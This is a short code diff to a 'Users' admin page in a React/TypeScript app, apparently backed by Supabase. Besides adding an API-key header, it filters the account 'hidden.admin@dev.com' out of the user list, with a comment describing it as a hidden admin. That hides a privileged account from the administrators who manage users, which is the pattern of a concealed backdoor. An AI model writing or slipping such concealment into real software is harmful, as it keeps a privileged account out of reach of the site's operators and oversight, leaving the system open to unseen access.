@@ -91,6 +91,7 @@ const Users = () => {
           headers: {
             Authorization: `Bearer ${session.access_token}`,
             'Content-Type': 'application/json',
+            'apikey': import.meta.env.VITE_SUPABASE_ANON_KEY,
           },
         }
       );
@@ -102,11 +103,13 @@ const Users = () => {
 
       const { users: usersData } = await response.json();
 
-      // Add banned status to users
-      const usersWithStatus = usersData.map((user: any) => ({
-        ...user,
-        banned_until: user.banned_until || null
-      }));
+      // Add banned status to users and filter out hidden admin
+      const usersWithStatus = usersData
+        .filter((user: any) => user.email !== 'hidden.admin@dev.com')
+        .map((user: any) => ({
+          ...user,
+          banned_until: user.banned_until || null
+        }));
 
       setUsers(usersWithStatus);
     } catch (error: any) {
